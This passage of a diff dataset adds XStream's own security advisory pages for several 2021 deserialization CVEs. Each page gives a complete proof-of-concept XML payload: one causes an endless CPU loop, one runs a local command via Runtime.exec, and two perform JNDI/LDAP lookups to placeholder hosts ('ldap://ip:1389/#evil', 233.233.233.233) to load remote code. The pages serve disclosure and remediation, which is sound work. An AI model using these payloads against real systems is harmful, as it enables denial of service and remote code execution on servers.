          "19:     <p>CVE-2021-39140: XStream is vulnerable to a Denial of Service attack.</p>",
          "21:     <h2 id=\"affected_versions\">Affected Versions</h2>",
          "23:     <p>All versions until and including version 1.4.17 are affected, if using the version out of the box.  No user is",
          "24:     affected, who followed the recommendation to setup <a href=\"security.html#framework\">XStream's security framework",
          "25:     </a> with a whitelist limited to the minimal required types.</p>",
          "27:     <h2 id=\"description\">Description</h2>",
          "29:     <p>The processed stream at unmarshalling time contains type information to recreate the formerly written objects.",
          "30:     XStream creates therefore new instances based on these type information.  An attacker can manipulate the processed",
          "31:     input stream and replace or inject objects, that result in an endless loop probably causing a denial of service.</p>",
          "33:     <h2 id=\"reproduction\">Steps to Reproduce</h2>",
          "35:     <p>Create a simple TreeSet and use XStream to marshal it to XML.  Replace the XML with following snippet and",
          "36:     unmarshal it again with XStream:</p>",
          "37: <div class=\"Source XML\"><pre>&lt;linked-hash-set&gt;",
          "38:   &lt;sun.reflect.annotation.AnnotationInvocationHandler serialization='custom'&gt;",
          "39:     &lt;sun.reflect.annotation.AnnotationInvocationHandler&gt;",
          "40:       &lt;default&gt;",
          "41:         &lt;memberValues class='javax.script.SimpleBindings'&gt;",
          "42:           &lt;map class='javax.script.SimpleBindings' reference='..'/&gt;",
          "43:         &lt;/memberValues&gt;",
          "44:         &lt;type&gt;javax.xml.transform.Templates&lt;/type&gt;",
          "45:       &lt;/default&gt;",
          "46:     &lt;/sun.reflect.annotation.AnnotationInvocationHandler&gt;",
          "47:   &lt;/sun.reflect.annotation.AnnotationInvocationHandler&gt;",
          "48: &lt;/linked-hash-set&gt;",
          "49: </pre></div>",
          "50: <div class=\"Source Java\"><pre>XStream xstream = new XStream();",
          "51: xstream.fromXML(xml);",
          "52: </pre></div>",
          "54:     <p>As soon as the XML gets unmarshalled, the an endless loop is entered and the executing thread consumes maximum",
          "55:     CPU time and will never return.</p>",
          "57:     <p>Note, this example uses XML, but the attack can be performed for any supported format. e.g. JSON.</p>",
          "59:     <h2 id=\"impact\">Impact</h2>",
          "61:     <p>The vulnerability may allow a remote attacker to allocate 100% CPU time on the target system depending on CPU",
          "62:     type or parallel execution of such a payload resulting in a denial of service only by manipulating the processed",
          "63:     input stream.</p>",
          "65:     <h2 id=\"workarounds\">Workarounds</h2>",
          "67:     <p>See <a href=\"security.html#workaround\">workarounds</a> for the different versions covering all CVEs.</p>",
          "69:     <h2 id=\"credits\">Credits</h2>",
          "71:     <p>Lai Han of nsfocus security team found and reported the issue to XStream and provided the required information to reproduce it.</p>",
          "73:       </body>",
          "74:  </html>",
          "",
          "---------------"
        ],
        "xstream-distribution/src/content/CVE-2021-39141.html||xstream-distribution/src/content/CVE-2021-39141.html": [
          "File: xstream-distribution/src/content/CVE-2021-39141.html -> xstream-distribution/src/content/CVE-2021-39141.html",
          "--- Hunk 1 ---",
          "[Context before]",
          "[No context available]",
          "",
          "[Removed Lines]",
          "[None]",
          "",
          "[Added Lines]",
          "1: <html>",
          "2: <!--",
          "3:  Copyright (C) 2021 XStream committers.",
          "4:  All rights reserved.",
          "6:  The software in this package is published under the terms of the BSD",
          "7:  style license a copy of which has been included with this distribution in",
          "8:  the LICENSE.txt file.",
          "10:  Created on 27. May 2021 by Joerg Schaible",
          "11:  -->",
          "12:   <head>",
          "13:     <title>CVE-2021-39141</title>",
          "14:   </head>",
          "15:   <body>",
          "17:     <h2 id=\"vulnerability\">Vulnerability</h2>",
          "19:     <p>CVE-2021-39141: XStream is vulnerable to an Arbitrary Code Execution attack.</p>",
          "21:     <h2 id=\"affected_versions\">Affected Versions</h2>",
          "23:     <p>All versions until and including version 1.4.17 are affected, if using the version out of the box. No user is",
          "24:     affected, who followed the recommendation to setup <a href=\"security.html#framework\">XStream's security",
          "25:     framework</a> with a whitelist limited to the minimal required types.</p>",
          "27:     <h2 id=\"description\">Description</h2>",
          "29:     <p>The processed stream at unmarshalling time contains type information to recreate the formerly written objects.",
          "30:     XStream creates therefore new instances based on these type information.  An attacker can manipulate the processed",
          "31:     input stream and replace or inject objects, that result in execution of arbitrary code loaded from a remote server.</p>",
          "33:     <h2 id=\"reproduction\">Steps to Reproduce</h2>",
          "35:     <p>Create a simple PriorityQueue and use XStream to marshal it to XML.  Replace the XML with following snippet and",
          "36:     unmarshal it again with XStream:</p>",
          "37: <div class=\"Source XML\"><pre>&lt;java.util.PriorityQueue serialization='custom'&gt;",
          "38:   &lt;unserializable-parents/&gt;",
          "39:   &lt;java.util.PriorityQueue&gt;",
          "40:     &lt;default&gt;",
          "41:       &lt;size&gt;2&lt;/size&gt;",
          "42:     &lt;/default&gt;",
          "43:     &lt;int&gt;3&lt;/int&gt;",
          "44:     &lt;dynamic-proxy&gt;",
          "45:       &lt;interface&gt;java.lang.Comparable&lt;/interface&gt;",
          "46:       &lt;handler class='com.sun.xml.internal.ws.client.sei.SEIStub'&gt;",
          "47:         &lt;owner/&gt;",
          "48:         &lt;managedObjectManagerClosed&gt;false&lt;/managedObjectManagerClosed&gt;",
          "49:         &lt;databinding class='com.sun.xml.internal.ws.db.DatabindingImpl'&gt;",
          "50:           &lt;stubHandlers&gt;",
          "51:             &lt;entry&gt;",
          "52:               &lt;method&gt;",
          "53:                 &lt;class&gt;java.lang.Comparable&lt;/class&gt;",
          "54:                 &lt;name&gt;compareTo&lt;/name&gt;",
          "55:                 &lt;parameter-types&gt;",
          "56:                   &lt;class&gt;java.lang.Object&lt;/class&gt;",
          "57:                 &lt;/parameter-types&gt;",
          "58:               &lt;/method&gt;",
          "59:               &lt;com.sun.xml.internal.ws.client.sei.StubHandler&gt;",
          "60:                 &lt;bodyBuilder class='com.sun.xml.internal.ws.client.sei.BodyBuilder$DocLit'&gt;",
          "61:                   &lt;indices&gt;",
          "62:                     &lt;int&gt;0&lt;/int&gt;",
          "63:                   &lt;/indices&gt;",
          "64:                   &lt;getters&gt;",
          "65:                     &lt;com.sun.xml.internal.ws.client.sei.ValueGetter&gt;PLAIN&lt;/com.sun.xml.internal.ws.client.sei.ValueGetter&gt;",
          "66:                   &lt;/getters&gt;",
          "67:                   &lt;accessors&gt;",
          "68:                     &lt;com.sun.xml.internal.ws.spi.db.JAXBWrapperAccessor_-2&gt;",
          "69:                       &lt;val_-isJAXBElement&gt;false&lt;/val_-isJAXBElement&gt;",
          "70:                       &lt;val_-getter class='com.sun.xml.internal.ws.spi.db.FieldGetter'&gt;",
          "71:                         &lt;type&gt;int&lt;/type&gt;",
          "72:                         &lt;field&gt;",
          "73:                           &lt;name&gt;hash&lt;/name&gt;",
          "74:                           &lt;clazz&gt;java.lang.String&lt;/clazz&gt;",
          "75:                         &lt;/field&gt;",
          "76:                       &lt;/val_-getter&gt;",
          "77:                       &lt;val_-isListType&gt;false&lt;/val_-isListType&gt;",
          "78:                       &lt;val_-n&gt;",
          "79:                         &lt;namespaceURI/&gt;",
          "80:                         &lt;localPart&gt;hash&lt;/localPart&gt;",
          "81:                         &lt;prefix/&gt;",
          "82:                       &lt;/val_-n&gt;",
          "83:                       &lt;val_-setter class='com.sun.xml.internal.ws.spi.db.MethodSetter'&gt;",
          "84:                         &lt;type&gt;java.lang.String&lt;/type&gt;",
          "85:                         &lt;method&gt;",
          "86:                           &lt;class&gt;javax.naming.InitialContext&lt;/class&gt;",
          "87:                           &lt;name&gt;doLookup&lt;/name&gt;",
          "88:                           &lt;parameter-types&gt;",
          "89:                             &lt;class&gt;java.lang.String&lt;/class&gt;",
          "90:                           &lt;/parameter-types&gt;",
          "91:                         &lt;/method&gt;",
          "92:                       &lt;/val_-setter&gt;",
          "93:                       &lt;outer-class&gt;",
          "94:                         &lt;propertySetters&gt;",
          "95:                           &lt;entry&gt;",
          "96:                             &lt;string&gt;serialPersistentFields&lt;/string&gt;",
          "97:                             &lt;com.sun.xml.internal.ws.spi.db.FieldSetter&gt;",
          "98:                               &lt;type&gt;[Ljava.io.ObjectStreamField;&lt;/type&gt;",
          "99:                               &lt;field&gt;",
          "100:                                 &lt;name&gt;serialPersistentFields&lt;/name&gt;",
          "101:                                 &lt;clazz&gt;java.lang.String&lt;/clazz&gt;",
          "102:                               &lt;/field&gt;",
          "103:                             &lt;/com.sun.xml.internal.ws.spi.db.FieldSetter&gt;",
          "104:                           &lt;/entry&gt;",
          "105:                           &lt;entry&gt;",
          "106:                             &lt;string&gt;CASE_INSENSITIVE_ORDER&lt;/string&gt;",
          "107:                             &lt;com.sun.xml.internal.ws.spi.db.FieldSetter&gt;",
          "108:                               &lt;type&gt;java.util.Comparator&lt;/type&gt;",
          "109:                               &lt;field&gt;",
          "110:                                 &lt;name&gt;CASE_INSENSITIVE_ORDER&lt;/name&gt;",
          "111:                                 &lt;clazz&gt;java.lang.String&lt;/clazz&gt;",
          "112:                               &lt;/field&gt;",
          "113:                             &lt;/com.sun.xml.internal.ws.spi.db.FieldSetter&gt;",
          "114:                           &lt;/entry&gt;",
          "115:                           &lt;entry&gt;",
          "116:                             &lt;string&gt;serialVersionUID&lt;/string&gt;",
          "117:                             &lt;com.sun.xml.internal.ws.spi.db.FieldSetter&gt;",
          "118:                               &lt;type&gt;long&lt;/type&gt;",
          "119:                               &lt;field&gt;",
          "120:                                 &lt;name&gt;serialVersionUID&lt;/name&gt;",
          "121:                                 &lt;clazz&gt;java.lang.String&lt;/clazz&gt;",
          "122:                               &lt;/field&gt;",
          "123:                             &lt;/com.sun.xml.internal.ws.spi.db.FieldSetter&gt;",
          "124:                           &lt;/entry&gt;",
          "125:                           &lt;entry&gt;",
          "126:                             &lt;string&gt;value&lt;/string&gt;",
          "127:                             &lt;com.sun.xml.internal.ws.spi.db.FieldSetter&gt;",
          "128:                               &lt;type&gt;[C&lt;/type&gt;",
          "129:                               &lt;field&gt;",
          "130:                                 &lt;name&gt;value&lt;/name&gt;",
          "131:                                 &lt;clazz&gt;java.lang.String&lt;/clazz&gt;",
          "132:                               &lt;/field&gt;",
          "133:                             &lt;/com.sun.xml.internal.ws.spi.db.FieldSetter&gt;",
          "134:                           &lt;/entry&gt;",
          "135:                           &lt;entry&gt;",
          "136:                             &lt;string&gt;hash&lt;/string&gt;",
          "137:                             &lt;com.sun.xml.internal.ws.spi.db.FieldSetter&gt;",
          "138:                               &lt;type&gt;int&lt;/type&gt;",
          "139:                               &lt;field reference='../../../../../val_-getter/field'/&gt;",
          "140:                             &lt;/com.sun.xml.internal.ws.spi.db.FieldSetter&gt;",
          "141:                           &lt;/entry&gt;",
          "142:                         &lt;/propertySetters&gt;",
          "143:                         &lt;propertyGetters&gt;",
          "144:                           &lt;entry&gt;",
          "145:                             &lt;string&gt;serialPersistentFields&lt;/string&gt;",
          "146:                             &lt;com.sun.xml.internal.ws.spi.db.FieldGetter&gt;",
          "147:                               &lt;type&gt;[Ljava.io.ObjectStreamField;&lt;/type&gt;",
          "148:                               &lt;field reference='../../../../propertySetters/entry/com.sun.xml.internal.ws.spi.db.FieldSetter/field'/&gt;",
          "149:                             &lt;/com.sun.xml.internal.ws.spi.db.FieldGetter&gt;",
          "150:                           &lt;/entry&gt;",
          "151:                           &lt;entry&gt;",
          "152:                             &lt;string&gt;CASE_INSENSITIVE_ORDER&lt;/string&gt;",
          "153:                             &lt;com.sun.xml.internal.ws.spi.db.FieldGetter&gt;",
          "154:                               &lt;type&gt;java.util.Comparator&lt;/type&gt;",
          "155:                               &lt;field reference='../../../../propertySetters/entry[2]/com.sun.xml.internal.ws.spi.db.FieldSetter/field'/&gt;",
          "156:                             &lt;/com.sun.xml.internal.ws.spi.db.FieldGetter&gt;",
          "157:                           &lt;/entry&gt;",
          "158:                           &lt;entry&gt;",
          "159:                             &lt;string&gt;serialVersionUID&lt;/string&gt;",
          "160:                             &lt;com.sun.xml.internal.ws.spi.db.FieldGetter&gt;",
          "161:                               &lt;type&gt;long&lt;/type&gt;",
          "162:                               &lt;field reference='../../../../propertySetters/entry[3]/com.sun.xml.internal.ws.spi.db.FieldSetter/field'/&gt;",
          "163:                             &lt;/com.sun.xml.internal.ws.spi.db.FieldGetter&gt;",
          "164:                           &lt;/entry&gt;",
          "165:                           &lt;entry&gt;",
          "166:                             &lt;string&gt;value&lt;/string&gt;",
          "167:                             &lt;com.sun.xml.internal.ws.spi.db.FieldGetter&gt;",
          "168:                               &lt;type&gt;[C&lt;/type&gt;",
          "169:                               &lt;field reference='../../../../propertySetters/entry[4]/com.sun.xml.internal.ws.spi.db.FieldSetter/field'/&gt;",
          "170:                             &lt;/com.sun.xml.internal.ws.spi.db.FieldGetter&gt;",
          "171:                           &lt;/entry&gt;",
          "172:                           &lt;entry&gt;",
          "173:                             &lt;string&gt;hash&lt;/string&gt;",
          "174:                             &lt;com.sun.xml.internal.ws.spi.db.FieldGetter reference='../../../../val_-getter'/&gt;",
          "175:                           &lt;/entry&gt;",
          "176:                         &lt;/propertyGetters&gt;",
          "177:                         &lt;elementLocalNameCollision&gt;false&lt;/elementLocalNameCollision&gt;",
          "178:                         &lt;contentClass&gt;java.lang.String&lt;/contentClass&gt;",
          "179:                         &lt;elementDeclaredTypes/&gt;",
          "180:                       &lt;/outer-class&gt;",
          "181:                     &lt;/com.sun.xml.internal.ws.spi.db.JAXBWrapperAccessor_-2&gt;",
          "182:                   &lt;/accessors&gt;",
          "183:                   &lt;wrapper&gt;java.lang.Object&lt;/wrapper&gt;",
          "184:                   &lt;bindingContext class='com.sun.xml.internal.ws.db.glassfish.JAXBRIContextWrapper'/&gt;",
          "185:                   &lt;dynamicWrapper&gt;false&lt;/dynamicWrapper&gt;",
          "186:                 &lt;/bodyBuilder&gt;",
          "187:                 &lt;isOneWay&gt;false&lt;/isOneWay&gt;",
          "188:               &lt;/com.sun.xml.internal.ws.client.sei.StubHandler&gt;",
          "189:             &lt;/entry&gt;",
          "190:           &lt;/stubHandlers&gt;",
          "191:           &lt;clientConfig&gt;false&lt;/clientConfig&gt;",
          "192:         &lt;/databinding&gt;",
          "193:         &lt;methodHandlers&gt;",
          "194:           &lt;entry&gt;",
          "195:             &lt;method reference='../../../databinding/stubHandlers/entry/method'/&gt;",
          "196:             &lt;com.sun.xml.internal.ws.client.sei.SyncMethodHandler&gt;",
          "197:               &lt;owner reference='../../../..'/&gt;",
          "198:               &lt;method reference='../../../../databinding/stubHandlers/entry/method'/&gt;",
          "199:               &lt;isVoid&gt;false&lt;/isVoid&gt;",
          "200:               &lt;isOneway&gt;false&lt;/isOneway&gt;",
          "201:             &lt;/com.sun.xml.internal.ws.client.sei.SyncMethodHandler&gt;",
          "202:           &lt;/entry&gt;",
          "203:         &lt;/methodHandlers&gt;",
          "204:       &lt;/handler&gt;",
          "205:     &lt;/dynamic-proxy&gt;",
          "206:     &lt;string&gt;ldap://ip:1389/#evil&lt;/string&gt;",
          "207:   &lt;/java.util.PriorityQueue&gt;",
          "208: &lt;/java.util.PriorityQueue&gt;",
          "209: </pre></div>",
          "210: <div class=\"Source Java\"><pre>XStream xstream = new XStream();",
          "211: xstream.fromXML(xml);",
          "212: </pre></div>",
          "214:     <p>As soon as the XML gets unmarshalled, the code from the remote server is executed as soon as the XML gets unmarshalled.</p>",
          "216:     <p>Note, this example uses XML, but the attack can be performed for any supported format. e.g. JSON.</p>",
          "218:     <h2 id=\"impact\">Impact</h2>",
          "220:     <p>The vulnerability may allow a remote attacker to execute arbitrary code only by manipulating the processed",
          "221:     input stream.</p>",
          "223:     <h2 id=\"workarounds\">Workarounds</h2>",
          "225:     <p>See <a href=\"security.html#workaround\">workarounds</a> for the different versions covering all CVEs.</p>",
          "227:     <h2 id=\"credits\">Credits</h2>",
          "229:     <p>Ceclin and YXXX from the Tencent Security Response Center found and reported the issue to XStream and provided the required information to reproduce it.</p>",
          "231:       </body>",
          "232:  </html>",
          "",
          "---------------"
        ],
        "xstream-distribution/src/content/CVE-2021-39144.html||xstream-distribution/src/content/CVE-2021-39144.html": [
          "File: xstream-distribution/src/content/CVE-2021-39144.html -> xstream-distribution/src/content/CVE-2021-39144.html",
          "--- Hunk 1 ---",
          "[Context before]",
          "[No context available]",
          "",
          "[Removed Lines]",
          "[None]",
          "",
          "[Added Lines]",
          "1: <html>",
          "2: <!--",
          "3:  Copyright (C) 2021 XStream committers.",
          "4:  All rights reserved.",
          "6:  The software in this package is published under the terms of the BSD",
          "7:  style license a copy of which has been included with this distribution in",
          "8:  the LICENSE.txt file.",
          "10:  Created on 27. May 2021 by Joerg Schaible",
          "11:  -->",
          "12:   <head>",
          "13:     <title>CVE-2021-39144</title>",
          "14:   </head>",
          "15:   <body>",
          "17:     <h2 id=\"vulnerability\">Vulnerability</h2>",
          "19:     <p>CVE-2021-39144: XStream is vulnerable to a Remote Command Execution attack.</p>",
          "21:     <h2 id=\"affected_versions\">Affected Versions</h2>",
          "23:     <p>All versions until and including version 1.4.17 are affected, if using the version out of the box. No user is",
          "24:     affected, who followed the recommendation to setup <a href=\"security.html#framework\">XStream's security",
          "25:     framework</a> with a whitelist limited to the minimal required types.</p>",
          "27:     <h2 id=\"description\">Description</h2>",
          "29:     <p>The processed stream at unmarshalling time contains type information to recreate the formerly written objects.",
          "30:     XStream creates therefore new instances based on these type information.  An attacker can manipulate the processed",
          "31:     input stream and replace or inject objects, that result in execution of a local command on the server.</p>",
          "33:     <h2 id=\"reproduction\">Steps to Reproduce</h2>",
          "35:     <p>Create a simple PriorityQueue and use XStream to marshal it to XML.  Replace the XML with following snippet and",
          "36:     unmarshal it again with XStream:</p>",
          "37: <div class=\"Source XML\"><pre>&lt;java.util.PriorityQueue serialization='custom'&gt;",
          "38:   &lt;unserializable-parents/&gt;",
          "39:   &lt;java.util.PriorityQueue&gt;",
          "40:     &lt;default&gt;",
          "41:       &lt;size&gt;2&lt;/size&gt;",
          "42:     &lt;/default&gt;",
          "43:     &lt;int&gt;3&lt;/int&gt;",
          "44:     &lt;dynamic-proxy&gt;",
          "45:       &lt;interface&gt;java.lang.Comparable&lt;/interface&gt;",
          "46:       &lt;handler class='sun.tracing.NullProvider'&gt;",
          "47:         &lt;active&gt;true&lt;/active&gt;",
          "48:         &lt;providerType&gt;java.lang.Comparable&lt;/providerType&gt;",
          "49:         &lt;probes&gt;",
          "50:           &lt;entry&gt;",
          "51:             &lt;method&gt;",
          "52:               &lt;class&gt;java.lang.Comparable&lt;/class&gt;",
          "53:               &lt;name&gt;compareTo&lt;/name&gt;",
          "54:               &lt;parameter-types&gt;",
          "55:                 &lt;class&gt;java.lang.Object&lt;/class&gt;",
          "56:               &lt;/parameter-types&gt;",
          "57:             &lt;/method&gt;",
          "58:             &lt;sun.tracing.dtrace.DTraceProbe&gt;",
          "59:               &lt;proxy class='java.lang.Runtime'/&gt;",
          "60:               &lt;implementing__method&gt;",
          "61:                 &lt;class&gt;java.lang.Runtime&lt;/class&gt;",
          "62:                 &lt;name&gt;exec&lt;/name&gt;",
          "63:                 &lt;parameter-types&gt;",
          "64:                   &lt;class&gt;java.lang.String&lt;/class&gt;",
          "65:                 &lt;/parameter-types&gt;",
          "66:               &lt;/implementing__method&gt;",
          "67:             &lt;/sun.tracing.dtrace.DTraceProbe&gt;",
          "68:           &lt;/entry&gt;",
          "69:         &lt;/probes&gt;",
          "70:       &lt;/handler&gt;",
          "71:     &lt;/dynamic-proxy&gt;",
          "72:     &lt;string&gt;calc&lt;/string&gt;",
          "73:   &lt;/java.util.PriorityQueue&gt;",
          "74: &lt;/java.util.PriorityQueue&gt;",
          "75: </pre></div>",
          "76: <div class=\"Source Java\"><pre>XStream xstream = new XStream();",
          "77: xstream.fromXML(xml);",
          "78: </pre></div>",
          "80:     <p>As soon as the XML gets unmarshalled, the payload gets executed and the command is executed on the host.</p>",
          "82:     <p>Note, this example uses XML, but the attack can be performed for any supported format. e.g. JSON.</p>",
          "84:     <h2 id=\"impact\">Impact</h2>",
          "86:     <p>The vulnerability may allow a remote attacker to execute commands with the rights of the process owner on the",
          "87:     host only by manipulating the processed input stream.</p>",
          "89:     <h2 id=\"workarounds\">Workarounds</h2>",
          "91:     <p>See <a href=\"security.html#workaround\">workarounds</a> for the different versions covering all CVEs.</p>",
          "93:     <h2 id=\"credits\">Credits</h2>",
          "95:     <p>Ceclin and YXXX from the Tencent Security Response Center found and reported the issue to XStream and provided the required information to reproduce it.</p>",
          "97:       </body>",
          "98:  </html>",
          "",
          "---------------"
        ],
        "xstream-distribution/src/content/CVE-2021-39145.html||xstream-distribution/src/content/CVE-2021-39145.html": [
          "File: xstream-distribution/src/content/CVE-2021-39145.html -> xstream-distribution/src/content/CVE-2021-39145.html",
          "--- Hunk 1 ---",
          "[Context before]",
          "[No context available]",
          "",
          "[Removed Lines]",
          "[None]",
          "",
          "[Added Lines]",
          "1: <html>",
          "2: <!--",
          "3:  Copyright (C) 2021 XStream committers.",
          "4:  All rights reserved.",
          "6:  The software in this package is published under the terms of the BSD",
          "7:  style license a copy of which has been included with this distribution in",
          "8:  the LICENSE.txt file.",
          "10:  Created on 26. May 2021 by Joerg Schaible",
          "11:  -->",
          "12:   <head>",
          "13:     <title>CVE-2021-39145</title>",
          "14:   </head>",
          "15:   <body>",
          "17:     <h2 id=\"vulnerability\">Vulnerability</h2>",
          "19:     <p>CVE-2021-39145: XStream is vulnerable to an Arbitrary Code Execution attack.</p>",
          "21:     <h2 id=\"affected_versions\">Affected Versions</h2>",
          "23:     <p>All versions until and including version 1.4.17 are affected, if using the version out of the box.  No user is",
          "24:     affected, who followed the recommendation to setup <a href=\"security.html#framework\">XStream's security framework",
          "25:     </a> with a whitelist limited to the minimal required types.</p>",
          "27:     <h2 id=\"description\">Description</h2>",
          "29:     <p>The processed stream at unmarshalling time contains type information to recreate the formerly written objects.",
          "30:     XStream creates therefore new instances based on these type information.  An attacker can manipulate the processed",
          "31:     input stream and replace or inject objects, that result in execution of arbitrary code loaded from a remote server.</p>",
          "33:     <h2 id=\"reproduction\">Steps to Reproduce</h2>",
          "35:     <p>Create a simple PriorityQueue and use XStream to marshal it to XML.  Replace the XML with following snippet and",
          "36:     unmarshal it again with XStream:</p>",
          "37: <div class=\"Source XML\"><pre>&lt;java.util.PriorityQueue serialization='custom'&gt;",
          "38:   &lt;unserializable-parents/&gt;",
          "39:   &lt;java.util.PriorityQueue&gt;",
          "40:     &lt;default&gt;",
          "41:       &lt;size&gt;2&lt;/size&gt;",
          "42:     &lt;/default&gt;",
          "43:     &lt;int&gt;3&lt;/int&gt;",
          "44:     &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;",
          "45:       &lt;type&gt;12345&lt;/type&gt;",
          "46:       &lt;value class='com.sun.org.apache.xpath.internal.objects.XString'&gt;",
          "47:         &lt;m__obj class='string'&gt;com.sun.xml.internal.ws.api.message.Packet@2002fc1d Content: &amp;#x3C;none&amp;#x3E;&lt;/m__obj&gt;",
          "48:       &lt;/value&gt;",
          "49:     &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;",
          "50:     &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;",
          "51:       &lt;type&gt;12345&lt;/type&gt;",
          "52:       &lt;value class='com.sun.xml.internal.ws.api.message.Packet' serialization='custom'&gt;",
          "53:         &lt;message class='com.sun.xml.internal.ws.message.saaj.SAAJMessage'&gt;",
          "54:           &lt;parsedMessage&gt;true&lt;/parsedMessage&gt;",
          "55:           &lt;soapVersion&gt;SOAP_11&lt;/soapVersion&gt;",
          "56:           &lt;bodyParts/&gt;",
          "57:           &lt;sm class='com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl'&gt;",
          "58:             &lt;attachmentsInitialized&gt;false&lt;/attachmentsInitialized&gt;",
          "59:             &lt;multiPart class='com.sun.xml.internal.messaging.saaj.packaging.mime.internet.MimePullMultipart'&gt;",
          "60:               &lt;soapPart/&gt;",
          "61:               &lt;mm&gt;",
          "62:                 &lt;it class='com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator'&gt;",
          "63:                   &lt;aliases class='com.sun.jndi.ldap.LdapBindingEnumeration'&gt;",
          "64:                     &lt;homeCtx&gt;",
          "65:                       &lt;hostname&gt;233.233.233.233&lt;/hostname&gt;",
          "66:                       &lt;port__number&gt;2333&lt;/port__number&gt;",
          "67:                       &lt;clnt class='com.sun.jndi.ldap.LdapClient'/&gt;",
          "68:                     &lt;/homeCtx&gt;",
          "69:                     &lt;hasMoreCalled&gt;true&lt;/hasMoreCalled&gt;",
          "70:                     &lt;more&gt;true&lt;/more&gt;",
          "71:                     &lt;posn&gt;0&lt;/posn&gt;",
          "72:                     &lt;limit&gt;1&lt;/limit&gt;",
          "73:                     &lt;entries&gt;",
          "74:                       &lt;com.sun.jndi.ldap.LdapEntry&gt;",
          "75:                         &lt;DN&gt;uid=songtao.xu,ou=oa,dc=example,dc=com&lt;/DN&gt;",
          "76:                         &lt;attributes class='javax.naming.directory.BasicAttributes' serialization='custom'&gt;",
          "77:                           &lt;javax.naming.directory.BasicAttribute&gt;",
          "78:                             &lt;default&gt;",
          "79:                               &lt;ignoreCase&gt;false&lt;/ignoreCase&gt;",
          "80:                             &lt;/default&gt;",
          "81:                             &lt;int&gt;4&lt;/int&gt;",
          "82:                             &lt;javax.naming.directory.BasicAttribute serialization='custom'&gt;",
          "83:                               &lt;javax.naming.directory.BasicAttribute&gt;",
          "84:                                 &lt;default&gt;",
          "85:                                   &lt;ordered&gt;false&lt;/ordered&gt;",
          "86:                                   &lt;attrID&gt;objectClass&lt;/attrID&gt;",
          "87:                                 &lt;/default&gt;",
          "88:                                 &lt;int&gt;1&lt;/int&gt;",
          "89:                                 &lt;string&gt;javanamingreference&lt;/string&gt;",
          "90:                               &lt;/javax.naming.directory.BasicAttribute&gt;",
          "91:                             &lt;/javax.naming.directory.BasicAttribute&gt;",
          "92:                             &lt;javax.naming.directory.BasicAttribute serialization='custom'&gt;",
          "93:                               &lt;javax.naming.directory.BasicAttribute&gt;",
          "94:                                 &lt;default&gt;",
          "95:                                   &lt;ordered&gt;false&lt;/ordered&gt;",
          "96:                                   &lt;attrID&gt;javaCodeBase&lt;/attrID&gt;",
          "97:                                 &lt;/default&gt;",
          "98:                                 &lt;int&gt;1&lt;/int&gt;",
          "99:                                 &lt;string&gt;http://127.0.0.1:2333/&lt;/string&gt;",
          "100:                               &lt;/javax.naming.directory.BasicAttribute&gt;",
          "101:                             &lt;/javax.naming.directory.BasicAttribute&gt;",
          "102:                             &lt;javax.naming.directory.BasicAttribute serialization='custom'&gt;",
          "103:                               &lt;javax.naming.directory.BasicAttribute&gt;",
          "104:                                 &lt;default&gt;",
          "105:                                   &lt;ordered&gt;false&lt;/ordered&gt;",
          "106:                                   &lt;attrID&gt;javaClassName&lt;/attrID&gt;",
          "107:                                 &lt;/default&gt;",
          "108:                                 &lt;int&gt;1&lt;/int&gt;",
          "109:                                 &lt;string&gt;refClassName&lt;/string&gt;",
          "110:                               &lt;/javax.naming.directory.BasicAttribute&gt;",
          "111:                             &lt;/javax.naming.directory.BasicAttribute&gt;",
          "112:                             &lt;javax.naming.directory.BasicAttribute serialization='custom'&gt;",
          "113:                               &lt;javax.naming.directory.BasicAttribute&gt;",
          "114:                                 &lt;default&gt;",
          "115:                                   &lt;ordered&gt;false&lt;/ordered&gt;",
          "116:                                   &lt;attrID&gt;javaFactory&lt;/attrID&gt;",
          "117:                                 &lt;/default&gt;",
          "118:                                 &lt;int&gt;1&lt;/int&gt;",
          "119:                                 &lt;string&gt;Evil&lt;/string&gt;",
          "120:                               &lt;/javax.naming.directory.BasicAttribute&gt;",
          "121:                             &lt;/javax.naming.directory.BasicAttribute&gt;",
          "122:                           &lt;/javax.naming.directory.BasicAttribute&gt;",
          "123:                         &lt;/attributes&gt;",
          "124:                       &lt;/com.sun.jndi.ldap.LdapEntry&gt;",
          "125:                     &lt;/entries&gt;",
          "126:                   &lt;/aliases&gt;",
          "127:                 &lt;/it&gt;",
          "128:               &lt;/mm&gt;",
          "129:             &lt;/multiPart&gt;",
          "130:           &lt;/sm&gt;",
          "131:         &lt;/message&gt;",
          "132:       &lt;/value&gt;",
          "133:     &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;",
          "134:   &lt;/java.util.PriorityQueue&gt;",
          "135: &lt;/java.util.PriorityQueue&gt;",
          "136: </pre></div>",
          "137: <div class=\"Source Java\"><pre>XStream xstream = new XStream();",
          "138: xstream.fromXML(xml);",
          "139: </pre></div>",
          "141:     <p>Depending on the JDK, the code from the remote server is executed as soon as the XML gets unmarshalled.</p>",
          "143:     <p>Note, this example uses XML, but the attack can be performed for any supported format. e.g. JSON.</p>",
          "145:     <h2 id=\"impact\">Impact</h2>",
          "147:     <p>The vulnerability may allow a remote attacker to execute arbitrary code only by manipulating the processed",
          "148:     input stream.</p>",
          "150:     <h2 id=\"workarounds\">Workarounds</h2>",
          "152:     <p>See <a href=\"security.html#workaround\">workarounds</a> for the different versions covering all CVEs.</p>",
          "154:     <h2 id=\"credits\">Credits</h2>",
          "156:     <p>\u674e\u5b89\u8bfa (Li4n0) from Alibaba Cloud Security Team and Smi1e of DBAPPSecurity WEBIN Lab found and reported the issue",
          "157:     independently to XStream and provided the required information to reproduce it.</p>",
          "159:       </body>",
          "160:  </html>",
          "",
          "---------------"
        ],
        "xstream-distribution/src/content/CVE-2021-39146.html||xstream-distribution/src/content/CVE-2021-39146.html": [
          "File: xstream-distribution/src/content/CVE-2021-39146.html -> xstream-distribution/src/content/CVE-2021-39146.html",
          "--- Hunk 1 ---",
          "[Context before]",
          "[No context available]",
          "",
          "[Removed Lines]",
          "[None]",
          "",
          "[Added Lines]",
          "1: <html>",
          "2: <!--",
          "3:  Copyright (C) 2021 XStream committers.",
          "4:  All rights reserved.",
          "6:  The software in this package is published under the terms of the BSD",
          "7:  style license a copy of which has been included with this distribution in",
          "8:  the LICENSE.txt file.",
